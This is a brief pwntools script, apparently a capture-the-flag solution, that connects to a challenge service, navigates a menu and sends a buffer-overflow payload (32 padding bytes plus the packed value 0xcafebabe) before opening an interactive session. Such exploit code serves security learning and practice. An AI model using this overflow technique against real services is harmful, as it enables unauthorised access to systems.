from pwn import *
#p = process('./chall')
host = '0.0.0.0'
port = 1000
p = remote(host,port)
p.recvuntil(b"")
p.sendline(b"2")
payload = b"A"*32 + p64(0xcafebabe)
p.recvuntil(b"")
p.sendline(payload)
p.recvuntil(b"")
p.sendline(b"3")
print(p.recvuntil(b""))
p.interactive()
